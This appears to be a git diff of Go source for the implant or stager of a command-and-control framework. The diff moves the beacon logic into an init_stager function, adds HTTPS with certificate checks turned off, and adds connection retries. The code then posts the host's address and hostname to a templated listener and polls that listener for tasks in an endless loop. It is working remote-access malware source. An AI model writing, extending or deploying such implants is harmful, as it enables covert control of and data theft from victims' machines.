@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -19,19 +20,24 @@ import (
 	"time"
 )
 
+// constants defined by the stager
 const (
 	STAGER            string = "{{stager.id}}"
 	LISTENER_IP       string = "{{stager.listener.address}}"
 	LISTENER_PORT     string = "{{stager.listener.port}}"
-	SSL               string = "{{stager.listener.ssl}}"
-	URL               string = "http://" + LISTENER_IP + ":" + LISTENER_PORT
+	SSL               string = "{{stager.listener.ssl | lower}}"
 	string_sleep_time string = "{{stager.options['sleep-time']}}"
 	string_delay      string = "{{stager.delay}}"
-) // constants defined by the stager
+	string_retries    string = "{{stager.retries}}"
+)
+
 var (
+	URL     string = LISTENER_IP + ":" + LISTENER_PORT
 	name           = ""
 	output  string = ""
 	success bool   = false
+	sleep_time int = 5
+	retries    int = 5
 )
 
 type Task struct {
@@ -49,6 +55,61 @@ type Module struct {
 	Language          string   `json:"language"`
 	Code_type         string   `json:"code_type"`
 	Execution_methods []string `json:"execution_methods"`
+}
+
+func init_stager() http.Client {
+	if SSL == "true" {
+		URL = "https://" + URL
+		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	} else {
+		URL = "http://" + URL
+	}
+	delay, _ := strconv.Atoi(string_delay)
+	sleep_time, _ = strconv.Atoi(string_sleep_time)
+	retries, _ = strconv.Atoi(string_retries)
+
+	// Set up the HTTP client
+	client := &http.Client{}
+
+	time.Sleep(time.Duration(delay) * time.Second)
+
+	data := system_info()
+
+	fmt.Println("Connecting to the L15t3n€r...")
+	
+	// check if we can connect to the listener so it doesn't stop the stager
+	_, err := client.Get(URL)
+
+	if err != nil {
+		fmt.Println("C0nn3ct10n f41l3d.")
+		for i := 0; i < retries; i++ {
+			fmt.Printf("R3trying (%d/%d)...\n", i+1, retries)
+			time.Sleep(time.Duration(sleep_time) * time.Second)
+			_, err := client.Get(URL)
+			if err == nil {
+				break
+			}
+		}
+	}
+
+	if err != nil {
+		fmt.Println("C0nn3ct10n f41l3d.")
+		os.Exit(1)
+	}
+
+	res, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))
+
+	if err != nil {
+		fmt.Println("C0nn3ct10n f41l3d.")
+		os.Exit(1)
+	} else {
+		fmt.Println("C0nn3ct3d.")
+	}
+
+	var result map[string]interface{}
+	json.NewDecoder(res.Body).Decode(&result)
+	name = result["name"].(string)
+	return *client
 }
 
 func system_info() []byte {
@@ -76,7 +137,7 @@ func system_info() []byte {
 		defer conn.Close()
 		address = conn.LocalAddr().(*net.UDPAddr).IP.String()
 	}
-
+	
 	data, err := json.Marshal(map[string]interface{}{
 		"address":      address,
 		"hostname":     hostname,
@@ -253,33 +314,14 @@ func upload_file(file_name string) {
 }
 
 func main() {
-	delay, _ := strconv.Atoi(string_delay)
-	sleep_time, _ := strconv.Atoi(string_sleep_time)
-	time.Sleep(time.Duration(delay) * time.Second)
-	// Set up the HTTP client
-	client := &http.Client{}
-
-	data := system_info()
-
-	fmt.Println("Connecting to the L15t3n€r...")
-	resp, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))
-
-	if err != nil {
-		fmt.Println("Could not connect to the l15t3n€r.")
-		os.Exit(1)
-	} else {
-		fmt.Println("C0nn3ct3d.")
-	}
-
-	var result map[string]interface{}
-	json.NewDecoder(resp.Body).Decode(&result)
-	name = result["name"].(string)
+	client := init_stager()
 
 	for {
 		time.Sleep(time.Duration(sleep_time) * time.Second)
 
 		// Get the tasks
 		resp, err := client.Get(URL + "/tasks/" + name)
+
 		if err != nil {
 			fmt.Println("Could not fetch tasks.")
 			continue
